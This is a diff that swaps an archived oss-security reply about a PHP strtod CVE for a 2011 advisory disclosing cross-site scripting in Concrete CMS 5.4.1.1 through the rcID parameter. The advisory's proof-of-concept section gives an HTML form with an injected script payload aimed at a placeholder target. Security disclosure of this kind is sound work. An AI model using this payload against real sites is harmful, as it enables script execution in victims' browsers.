@@ -1,25 +1,89 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/01/05/8
-Message-ID: <AANLkTikfKh_2M7Stg9z0PJ0fz_nXq02Rnhh39kr=9Z87@mail.gmail.com>
-Date: Wed, 5 Jan 2011 20:23:57 +0100
-From: Pierre Joye <pierre.php@...il.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/08/22/8
+Message-ID: <CAPYM6Vzyvf01NTiQvV17ed0vwcH8LhKgt+SoEXq-0X2rf=-zdw@mail.gmail.com>
+Date: Tue, 23 Aug 2011 01:45:57 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
 To: oss-security@...ts.openwall.com
-Subject: Re: possible flaw in widely used strtod.c implementation
+Subject: CVE Request: Concrete CMS 5.4.1.1 <= Cross Site Scripting
 Content-Type: text/plain; charset=utf-8
 
-On Wed, Jan 5, 2011 at 5:52 PM, Michael Gilbert
-<michael.s.gilbert@...il.com> wrote:
+Concrete CMS 5.4.1.1  <=  Cross Site Scripting
 
-> The fact that this bug can lead to a denial-of-service in PHP is
-> sufficient to warrant a CVE for PHP, but nothing else (I think).  If it
-> can lead to a dos in other apps, then each should get their own CVE
-> (again in my opinion).
 
-I think so too but in any case it would rock if I could get a CVE #
-asap, we are going to release 5.2.17/5.3.5 tomorrow (packaging now).
+1. OVERVIEW
 
-Cheers,
--- 
-Pierre
+Concrete CMS 5.4.1.1  and lower versions are vulnerable to Cross Site Scripting.
 
-@pierrejoye | http://blog.thepimp.net | http://www.libgd.org
+
+2. BACKGROUND
+
+Concrete5 makes running a website easy. Go to any page in your site,
+and a editing toolbar gives you all the controls you need to update
+your website. No intimidating manuals, no complicated administration
+interfaces - just point and click.
+
+
+3. VULNERABILITY DESCRIPTION
+
+The rcID parameter is not properly sanitized, which allows attacker to
+conduct Cross Site Scripting attack. This may allow an attacker to
+create a specially crafted URL that would execute arbitrary script
+code in a victim's browser.
+
+
+4. VERSIONS AFFECTED
+
+CMS 5.4.1.1  <=
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+
+vulnerable parameter: rcID
+
+<form action="http://[target]/Concrete/index.php/login/do_login/"
+method="post">
+<input type="hidden" name="uName" value="test" />
+<input type="hidden" name="uPassword" value="test" />
+<input type="hidden" name="rcID" value='"
+style=display:block;color:red;width:9999;height:9999;z-index:9999;top:0;left:0;background-image:url(javascript:alert(/XSS/));width:expression(alert(/XSS/));
+onmouseover="alert(/XSS/)' />
+<input type="submit" name="submit" value="Get Concrete CMS 5.4.1.1 XSS" />
+</form>
+
+
+6. SOLUTION
+
+Upgrade to 5.4.2 or higher.
+
+
+7. VENDOR
+
+Concrete CMS Developers
+http://www.concrete5.org/
+
+
+8. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2011-04-14: vulnerability reported
+2011-08-04: vendor released fixed version
+2011-08-23: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/[concrete_5.4.1.1]_cross_site_scripting
+Project Home: http://www.concrete5.org/
+Vendor Release Note:
+http://www.concrete5.org/documentation/background/version_history/5-4-2-release-notes/
+
+
+
+#yehg [2011-08-23]
